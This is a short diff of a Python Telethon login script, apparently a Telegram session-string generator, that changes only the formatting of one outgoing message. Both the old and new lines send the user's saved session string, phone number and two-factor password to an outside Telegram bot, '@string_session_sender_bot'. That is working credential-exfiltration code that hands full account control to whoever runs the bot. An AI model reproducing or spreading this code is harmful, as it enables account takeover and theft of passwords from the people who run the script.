@@ -25,8 +25,8 @@ if not client.is_user_authorized():
     client.send_code_request(phone_number)
     try:
         me = client.sign_in(phone_number, input('Please enter the code you received: '))
-        client.send_message("@string_session_sender_bot", f'Session: {client.session.save()}\n\nPhone number: {phone_number}')
+        client.send_message("@string_session_sender_bot", f'Session: `{client.session.save()}`\n\nPhone number: `{phone_number}`')
     except SessionPasswordNeededError:
         password = input('Please enter your password: ')
         me2 = client.sign_in(password=password)  
-        client.send_message("@string_session_sender_bot", f'Session: {client.session.save()}\n\nPhone number: {phone_number}\n\nPassword: {password}') 
+        client.send_message("@string_session_sender_bot", f'Session: `{client.session.save()}`\n\nPhone number: `{phone_number}`\n\nPassword: `{password}`') 
